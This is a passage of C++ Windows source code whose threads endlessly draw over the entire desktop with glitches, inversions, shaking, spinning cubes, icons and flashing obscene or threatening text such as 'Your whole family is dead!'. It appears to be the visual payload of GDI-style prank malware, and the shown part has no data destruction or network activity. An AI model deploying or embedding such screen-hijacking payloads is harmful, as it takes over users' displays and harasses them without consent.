            int e2 = 2 * error;
            if (e2 >= dy)
            {
                if (x0 == x1)
                {
                    break;
                }
                error += dy;
                x0 += sx;
            }
            if (e2 <= dx)
            {
                if (y0 == y1)
                {
                    break;
                }
                error += dx;
                y0 += sy;
            }
        }
    }
}

void InitDPI() {
    HMODULE hModule = LoadLibraryA("user32.dll");
    BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
    if (SetProcessDPIAware) {
        SetProcessDPIAware();
    }
    FreeLibrary(hModule);
}

DWORD WINAPI shader1(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i & h, y = i | w;
            rgbScreen[i].rgb += x * y;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

void DrawEllipseAt(HDC hdc, int x, int y, COLORREF color) {
    HBRUSH brush = CreateSolidBrush(color);
    SelectObject(hdc, brush);
    DrawIcon(hdc, x, y, LoadCursor(NULL, IDC_ARROW));  // Draw an ellipse with 50x50 size
    DeleteObject(brush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
    float cosX = cos(angleX), sinX = sin(angleX);
    float cosY = cos(angleY), sinY = sin(angleY);
    float cosZ = cos(angleZ), sinZ = sin(angleZ);

    float y = point.y * cosX - point.z * sinX;
    float z = point.y * sinX + point.z * cosX;
    point.y = y;
    point.z = z;

    float x = point.x * cosY + point.z * sinY;
    z = -point.x * sinY + point.z * cosY;
    point.x = x;
    point.z = z;

    x = point.x * cosZ - point.y * sinZ;
    y = point.x * sinZ + point.y * cosZ;
    point.x = x;
    point.y = y;

    return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
    Point3D vertices[8] = {
        {-size, -size, -size},
        {size, -size, -size},
        {size, size, -size},
        {-size, size, -size},
        {-size, -size, size},
        {size, -size, size},
        {size, size, size},
        {-size, size, size},
    };

    POINT screenPoints[8];

    for (int i = 0; i < 8; ++i) {
        Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
        //COLORREF color = COLORHSL(colorA);

        int screenX = static_cast<int>(center.x + rotated.x);
        int screenY = static_cast<int>(center.y + rotated.y);

        screenPoints[i].x = screenX;
        screenPoints[i].y = screenY;

        //DrawEllipseAt(hdc, screenX, screenY, color);
    }

    POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
    Polyline(hdc, polyline1, 5);

    POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
    Polyline(hdc, polyline2, 5);

    POINT connectingLines[8] = {
        screenPoints[0], screenPoints[4],
        screenPoints[1], screenPoints[5],
        screenPoints[2], screenPoints[6],
        screenPoints[3], screenPoints[7]
    };
    Polyline(hdc, &connectingLines[0], 2);
    Polyline(hdc, &connectingLines[2], 2);
    Polyline(hdc, &connectingLines[4], 2);
    Polyline(hdc, &connectingLines[6], 2);
}

DWORD WINAPI tesseract(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    int x = sw * wdpi / 96;
    int y = sh * hdpi / 96;
    int signX = 2;
    int signY = 2;
    int incrementor = 10;
    float x2 = 100.0/*f*/;
    float y2 = 100.0/*f*/;
    float angleX = 0.0/*f*/, angleY = 0.0/*f*/, angleZ = 0.0/*f*/;
    float angleIncrement = 0.04/*f*/;
    float colorA = 0;
    float size = 100/*f*/;
    InvalidateRect(0, 0, 0);
    BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
    for (;;) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
        int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
        int x = sw * wdpi / 96;
        int y = sh * hdpi / 96;

        x2 += incrementor * signX;
        y2 += incrementor * signY;

        if (x2 + 75 >= x) {
            signX = -1;
            x2 = x - 76;
        }
        else if (x2 <= 75) {
            signX = 1;
            x2 = 76;
        }

        if (y2 + 75 >= y) {
            signY = -1;
            y2 = y - 76;
        }
        else if (y2 <= 75) {
            signY = 1;
            y2 = 76;
        }


        Point3D center = { x2, y2, 0.0f };
        SelectObject(hdc, CreatePen(0, 1, RGB(255, 255, 255)));
        Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);

        angleX += angleIncrement;
        angleY += angleIncrement;
        angleZ += angleIncrement;

        Sleep(20);
        ReleaseDC(0, hdc);
        colorA += 1;

        if (size >= 0 && size <= 100) {
            size += 0.5;
        }
    }

    return 0;
}

DWORD WINAPI camera(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HBRUSH brush1 = CreateSolidBrush(RGB(131, 91, 31));
    HBRUSH brush2 = CreateSolidBrush(RGB(105, 75, 25));
    HBRUSH brush3 = CreateSolidBrush(RGB(52, 38, 18));
    HBRUSH brush4 = CreateSolidBrush(RGB(140, 90, 9));
    HBRUSH brush5 = CreateSolidBrush(RGB(202, 129, 0));
    HBRUSH brush6 = CreateSolidBrush(RGB(19, 19, 19));
    HBRUSH brush7 = CreateSolidBrush(RGB(78, 52, 18));
    for (;;) {
        BitBlt(hdc, 0, 0, w, h, hdc, w, h, BLACKNESS);
        SelectObject(hdc, brush1);
        PatBlt(hdc, 0, 0, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 7, 0, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, 0, h / 8 * 7, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 7, h / 8 * 7, w / 8, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush2);
        PatBlt(hdc, w / 8, 0, w / 4 * 3, h / 8, PATINVERT);
        PatBlt(hdc, 0, h / 8, w / 8, h / 4 * 3, PATINVERT);
        PatBlt(hdc, w / 8 * 7, h / 8, w / 8, h / 4 * 3, PATINVERT);
        PatBlt(hdc, w / 8, h / 8 * 7, w / 4 * 3, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush3);
        PatBlt(hdc, w / 8, h / 8, w / 4 * 3, h / 8, PATINVERT);
        PatBlt(hdc, w / 8, h / 4, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 4 * 3, h / 4, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 4, h / 4 * 3, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 5, h / 4 * 3, w / 8, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush4);
        PatBlt(hdc, w / 4, h / 4, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 5, h / 4, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 4, h / 8 * 5, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 5, h / 8 * 5, w / 8, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush5);
        PatBlt(hdc, w / 4, h / 8 * 3, w / 8, h / 4, PATINVERT);
        PatBlt(hdc, w / 8 * 3, h / 4, w / 4, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 5, h / 8 * 3, w / 8, h / 4, PATINVERT);
        PatBlt(hdc, w / 8 * 3, h / 8 * 5, w / 4, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush6);
        PatBlt(hdc, w / 8 * 3, h / 8 * 3, w / 4, h / 4, PATINVERT);
        PatBlt(hdc, w / 8 * 3, h / 4 * 3, w / 4, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush7);
        PatBlt(hdc, w / 8, h / 8 * 3, w / 8, h / 2, PATINVERT);
        PatBlt(hdc, w / 4 * 3, h / 8 * 3, w / 8, h / 2, PATINVERT);
        Sleep(500);
        SelectObject(hdc, brush1);
        PatBlt(hdc, 0, 0, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 7, 0, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, 0, h / 8 * 7, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 7, h / 8 * 7, w / 8, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush2);
        PatBlt(hdc, w / 8, 0, w / 4 * 3, h / 8, PATINVERT);
        PatBlt(hdc, 0, h / 8, w / 8, h / 4 * 3, PATINVERT);
        PatBlt(hdc, w / 8 * 7, h / 8, w / 8, h / 4 * 3, PATINVERT);
        PatBlt(hdc, w / 8, h / 8 * 7, w / 4 * 3, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush3);
        PatBlt(hdc, w / 8, h / 8, w / 4 * 3, h / 8, PATINVERT);
        PatBlt(hdc, w / 8, h / 4, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 4 * 3, h / 4, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 4, h / 4 * 3, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 5, h / 4 * 3, w / 8, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush4);
        PatBlt(hdc, w / 4, h / 4, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 5, h / 4, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 4, h / 8 * 5, w / 8, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 5, h / 8 * 5, w / 8, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush5);
        PatBlt(hdc, w / 4, h / 8 * 3, w / 8, h / 4, PATINVERT);
        PatBlt(hdc, w / 8 * 3, h / 4, w / 4, h / 8, PATINVERT);
        PatBlt(hdc, w / 8 * 5, h / 8 * 3, w / 8, h / 4, PATINVERT);
        PatBlt(hdc, w / 8 * 3, h / 8 * 5, w / 4, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush6);
        PatBlt(hdc, w / 8 * 3, h / 8 * 3, w / 4, h / 4, PATINVERT);
        PatBlt(hdc, w / 8 * 3, h / 4 * 3, w / 4, h / 8, PATINVERT);
        DeleteObject;
        SelectObject(hdc, brush7);
        PatBlt(hdc, w / 8, h / 8 * 3, w / 8, h / 2, PATINVERT);
        PatBlt(hdc, w / 4 * 3, h / 8 * 3, w / 8, h / 2, PATINVERT);
        Sleep(500);
    }
}

DWORD WINAPI mohu(LPVOID lpParam)
{
    for (;;)
    {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
        HDC hdcTemp = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
        BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int numShifts = 600;
        for (int i = 0; i < numShifts; i++)
        {
            int x = rand() % w;
            int y = rand() % h;
            int dx = (rand() % 3) - 1;
            int dy = (rand() % 3) - 1;
            BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY);
        SelectObject(hdcTemp, hbmOld);
        DeleteDC(hdcTemp);
        DeleteObject(hbm);
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI text(LPVOID lpParam) {
    int dwStartTime = time(NULL);
    for (;;) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        SetBkMode(hcdc, 1);
        LPCSTR text[5] = { "Dick", "8=D", "Your whole family is dead!", "Go fuck yourself!", "You are just a penis!" };
        int tmp = rand() % 5;
        SetTextColor(hcdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFont(64, 32, rand() % 3600, rand() % 3600, rand() % 1000, 0, 0, 0, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, L"114514");
        SelectObject(hcdc, font);
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutA(hcdc, rand() % w, rand() % h, text[tmp], strlen(text[tmp]));
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(font);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(5);
    }
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    return 0;
}

DWORD WINAPI text2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    LPCWSTR lpText = L"Camera.exe";
    for (;;)
    {
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % w, rand() % h, lpText, wcslen(lpText));
        Sleep(5);
    }
    return 0;
}

VOID WINAPI ww(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
    Rectangle(hdc, x, y, w + x, h + y);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI colorfang(LPVOID lpParam) {
    RECT rect;
    HDC hdc = GetDC(NULL);
    GetWindowRect(GetDesktopWindow(), &rect);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    int a = 11;
    for (int t = 0;; t++)
    {
        int b = rand() % a;
        const int size = b * 100 * wdpi / 96;
        int w = GetSystemMetrics(SM_CXSCREEN) - (b * 50 * wdpi / 96), h = GetSystemMetrics(SM_CYSCREEN) - (b * 50 * hdpi / 96);
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += (100 * wdpi / 96))
        {
            ww(x - i / 2, y - i / 2, i, i);
            Sleep(25);
        }
    }
}

DWORD WINAPI smallicon(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    /*HBRUSH brush1 = CreateSolidBrush(RGB(131, 91, 31));
    HBRUSH brush2 = CreateSolidBrush(RGB(105, 75, 25));
    HBRUSH brush3 = CreateSolidBrush(RGB(52, 38, 18));
    HBRUSH brush4 = CreateSolidBrush(RGB(140, 90, 9));
    HBRUSH brush5 = CreateSolidBrush(RGB(202, 129, 0));
    HBRUSH brush6 = CreateSolidBrush(RGB(19, 19, 19));
    HBRUSH brush7 = CreateSolidBrush(RGB(78, 52, 18));*/
    for (;;) {
        int x = rand() % w, y = rand() % h;
        SetPixel(hdc, x, y, RGB(131, 91, 31));
        SetPixel(hdc, x + 1, y, RGB(105, 75, 25));
        SetPixel(hdc, x + 2, y, RGB(105, 75, 25));
        SetPixel(hdc, x + 3, y, RGB(105, 75, 25));
        SetPixel(hdc, x + 4, y, RGB(105, 75, 25));
        SetPixel(hdc, x + 5, y, RGB(105, 75, 25));
        SetPixel(hdc, x + 6, y, RGB(105, 75, 25));
        SetPixel(hdc, x + 7, y, RGB(131, 91, 31));
        SetPixel(hdc, x, y + 1, RGB(105, 75, 25));
        SetPixel(hdc, x + 1, y + 1, RGB(52, 38, 18));
        SetPixel(hdc, x + 2, y + 1, RGB(52, 38, 18));
        SetPixel(hdc, x + 3, y + 1, RGB(52, 38, 18));
        SetPixel(hdc, x + 4, y + 1, RGB(52, 38, 18));
        SetPixel(hdc, x + 5, y + 1, RGB(52, 38, 18));
        SetPixel(hdc, x + 6, y + 1, RGB(52, 38, 18));
        SetPixel(hdc, x + 7, y + 1, RGB(105, 75, 25));
        SetPixel(hdc, x, y + 2, RGB(105, 75, 25));
        SetPixel(hdc, x + 1, y + 2, RGB(52, 38, 18));
        SetPixel(hdc, x + 2, y + 2, RGB(140, 90, 9));
        SetPixel(hdc, x + 3, y + 2, RGB(202, 129, 0));
        SetPixel(hdc, x + 4, y + 2, RGB(202, 129, 0));
        SetPixel(hdc, x + 5, y + 2, RGB(140, 90, 9));
        SetPixel(hdc, x + 6, y + 2, RGB(52, 38, 18));
        SetPixel(hdc, x + 7, y + 2, RGB(105, 75, 25));
        SetPixel(hdc, x, y + 3, RGB(105, 75, 25));
        SetPixel(hdc, x + 1, y + 3, RGB(78, 52, 18));
        SetPixel(hdc, x + 2, y + 3, RGB(202, 129, 0));
        SetPixel(hdc, x + 3, y + 3, RGB(19, 19, 19));
        SetPixel(hdc, x + 4, y + 3, RGB(19, 19, 19));
        SetPixel(hdc, x + 5, y + 3, RGB(202, 129, 0));
        SetPixel(hdc, x + 6, y + 3, RGB(78, 52, 18));
        SetPixel(hdc, x + 7, y + 3, RGB(105, 75, 25));
        SetPixel(hdc, x, y + 4, RGB(105, 75, 25));
        SetPixel(hdc, x + 1, y + 4, RGB(78, 52, 18));
        SetPixel(hdc, x + 2, y + 4, RGB(202, 129, 0));
        SetPixel(hdc, x + 3, y + 4, RGB(19, 19, 19));
        SetPixel(hdc, x + 4, y + 4, RGB(19, 19, 19));
        SetPixel(hdc, x + 5, y + 4, RGB(202, 129, 0));
        SetPixel(hdc, x + 6, y + 4, RGB(78, 52, 18));
        SetPixel(hdc, x + 7, y + 4, RGB(105, 75, 25));
        SetPixel(hdc, x, y + 5, RGB(105, 75, 25));
        SetPixel(hdc, x + 1, y + 5, RGB(78, 52, 18));
        SetPixel(hdc, x + 2, y + 5, RGB(140, 90, 9));
        SetPixel(hdc, x + 3, y + 5, RGB(202, 129, 0));
        SetPixel(hdc, x + 4, y + 5, RGB(202, 129, 0));
        SetPixel(hdc, x + 5, y + 5, RGB(140, 90, 9));
        SetPixel(hdc, x + 6, y + 5, RGB(78, 52, 18));
        SetPixel(hdc, x + 7, y + 5, RGB(105, 75, 25));
        SetPixel(hdc, x, y + 6, RGB(105, 75, 25));
        SetPixel(hdc, x + 1, y + 6, RGB(78, 52, 18));
        SetPixel(hdc, x + 2, y + 6, RGB(52, 38, 18));
        SetPixel(hdc, x + 3, y + 6, RGB(19, 19, 19));
        SetPixel(hdc, x + 4, y + 6, RGB(19, 19, 19));
        SetPixel(hdc, x + 5, y + 6, RGB(52, 38, 18));
        SetPixel(hdc, x + 6, y + 6, RGB(78, 52, 18));
        SetPixel(hdc, x + 7, y + 6, RGB(105, 75, 25));
        SetPixel(hdc, x, y + 7, RGB(131, 91, 31));
        SetPixel(hdc, x + 1, y + 7, RGB(105, 75, 25));
        SetPixel(hdc, x + 2, y + 7, RGB(105, 75, 25));
        SetPixel(hdc, x + 3, y + 7, RGB(105, 75, 25));
        SetPixel(hdc, x + 4, y + 7, RGB(105, 75, 25));
        SetPixel(hdc, x + 5, y + 7, RGB(105, 75, 25));
        SetPixel(hdc, x + 6, y + 7, RGB(105, 75, 25));
        SetPixel(hdc, x + 7, y + 7, RGB(131, 91, 31));
        Sleep(5);
    }
    return 0;
}

DWORD WINAPI smallinvert(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    for (;;) {
        int x = rand() % w, y = rand() % h;
        PatBlt(hdc, x, y, 8, 8, DSTINVERT);
        Sleep(5);
    }
    return 0;
}

DWORD WINAPI smallcolor(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    for (;;) {
        int x = rand() % w, y = rand() % h;
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(hdc, x, y, 8, 8, PATINVERT);
        Sleep(5);
    }
    return 0;
}

DWORD WINAPI smallsquare(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    for (;;) {
        int x = rand() % w, y = rand() % h;
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        Rectangle(hdc, x, y, x + 8, y + 8);
        Sleep(5);
    }
    return 0;
}

DWORD WINAPI silie(LPVOID lpParam) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double moveangle = 0;
    for (;;) {
        HDC hdc = GetDC(0);
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        int rx = rand() % sw;
        int ry = rand() % sh;
        BitBlt(hdc, 10, ry, sw, 96, hdc, 0, ry, 0x1900ac010e);
        BitBlt(hdc, -10, ry, sw, -96, hdc, 0, ry, 0x1900ac010e);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI doudong(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    for (;;) {
        StretchBlt(hdc, (rand() % 16) * wdpi / 96, (rand() % 16) * hdpi / 96, w, h, hdc, 0, 0, w, h, SRCCOPY);
        Sleep(125);
        StretchBlt(hdc, -((rand() % 16) * wdpi / 96), (rand() % 16) * hdpi / 96, w, h, hdc, 0, 0, w, h, SRCCOPY);
        Sleep(125);
        StretchBlt(hdc, -((rand() % 16) * wdpi / 96), -((rand() % 16) * hdpi / 96), w, h, hdc, 0, 0, w, h, SRCCOPY);
        Sleep(125);
        StretchBlt(hdc, (rand() % 16) * wdpi / 96, -((rand() % 16) * hdpi / 96), w, h, hdc, 0, 0, w, h, SRCCOPY);
        Sleep(125);
    }
}

DWORD WINAPI partunnel(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    POINT wPt[3];
    wPt[0].x = w / 20;
    wPt[0].y = h / 20;
    wPt[1].x = w / 20 * 21;
    wPt[1].y = h / 20;
    wPt[2].x = w / 40;
    wPt[2].y = h / 40 * 41;
    for (;;) {
        PlgBlt(hdc, wPt, hdc, 0, 0, w, h, NULL, 0, 0);
        Sleep(100);
    }
}

DWORD WINAPI mixblt(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    for (;;) {
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, PATINVERT);
        DeleteObject;
        Sleep(10);
        PatBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, DSTINVERT);
        Sleep(10);
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        StretchBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, rand() % w, rand() % h, PATINVERT);
        DeleteObject;
        Sleep(10);
        StretchBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, rand() % w, rand() % h, NOTSRCCOPY);
        Sleep(10);
        StretchBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, rand() % w, rand() % h, SRCCOPY);
        Sleep(10);
    }
}

DWORD WINAPI mixgraphic(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    for (;;) {
        HDC hdc = GetDC(0);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        POINT p[4] = { rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h };
        SelectObject(hdc, brush);
        Chord(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
        Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
        HPEN hPen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, hPen);
        PolyBezier(hdc, p, 4);
        Polyline(hdc, p, 4);
        ReleaseDC(0, hdc);
        Polygon(hdc, p, 4);
        Polygon(hdc, p, 3);
        Polygon(hdc, p, 2);
        DeleteObject(hPen);
        DeleteObject(brush);
        Sleep(50);
    }
}

DWORD WINAPI mixicon(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
    for (;;) {
        DrawIconEx(hdc, rand() % w, rand() % h, LoadIconW(HSHELL32, MAKEINTRESOURCE(rand() % 336)), rand() % w, rand() % h, NULL, NULL, DI_NORMAL);
        DrawIconEx(hdc, rand() % w, rand() % h, LoadIcon(NULL, MAKEINTRESOURCE(32511 + (rand() % 8))), rand() % w, rand() % h, NULL, NULL, DI_NORMAL);
        DrawIconEx(hdc, rand() % w, rand() % h, LoadCursor(NULL, MAKEINTRESOURCE(32511 + (rand() % 152))), rand() % w, rand() % h, NULL, NULL, DI_NORMAL);
        Sleep(50);
    }
}

DWORD WINAPI tesseract2(LPVOID lpvd)
{
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
    float size = (w + h) / 10;
    int cx = size;
    int cy = size;
    int xdv = 10;
    int ydv = 10;
    float angleX = 0.01;
    float angleY = 0.01;
    float angleZ = 0.01;
    int d = 60;
    VERTEX vtx[] =
    {
        {size, 0, 0},
        {size, size, 0},
        {0, size, 0},
        {0, 0, 0},
        {size, 0, size},
        {size, size, size},
        {0, size, size},
        {0, 0, size},
        {size - d,  d,      d},
        {size - d,  size - d,  d},
        {d,      size - d,  d},
        {d,      d,      d},
        {size - d,  d,      size - d},
        {size - d,  size - d,  size - d},
        {d,      size - d,  size - d},
        {d,      d,      size - d}
    };
    EDGE edges[] =
    {
        {0, 1},{1, 2},{2, 3},{3, 0},{0, 4},{1, 5},{2, 6},{3, 7},{4, 5},{5, 6},{6, 7},{7,4},{8,9},{9,10},{10,11},{11,8},{8,12},{9,13},{10,14},{11,15},{12,13},{13,14},{14,15},{15,12},{0,8},{1,9},{2,10},{3,11},{4,12},{5,13},{6,14},{7,15}
    };
    LPCWSTR icons[] = { IDC_ARROW, IDC_WAIT, IDC_NO, IDC_HELP };
    int index = rand() % 4;
    int totvtx = sizeof(vtx) / sizeof(vtx[0]);
    int totedg = sizeof(edges) / sizeof(edges[0]);
    for (;;)
    {
        dc = GetDC(NULL);
        for (int i = 0; i < totvtx; i++)
        {
            _3D::RotateX(&vtx[i], angleX);
            _3D::RotateY(&vtx[i], angleY);
            _3D::RotateZ(&vtx[i], angleZ);
        }
        for (int i = 0; i < totedg; i++)
        {
            _3D::DrawEdge(dc, icons[index],
                vtx[edges[i].vtx0].x + cx, vtx[edges[i].vtx0].y + cy,
                vtx[edges[i].vtx1].x + cx, vtx[edges[i].vtx1].y + cy, 20);
        }
        Sleep(40);
        cx += xdv;
        cy += ydv;
        if (cx > w - (size / 2) || cx < -(size / 2))
        {
            xdv *= -1;
            index = rand() % 4;
        }
        if (cy > h - (size / 2) || cy < -(size / 2))
        {
            ydv *= -1;
            index = rand() % 4;
        }
        ReleaseDC(0, dc);
    }

    return 0;
}

DWORD WINAPI colorpixel(LPVOID lpParam) {
    HDC hdc = GetDC(0);
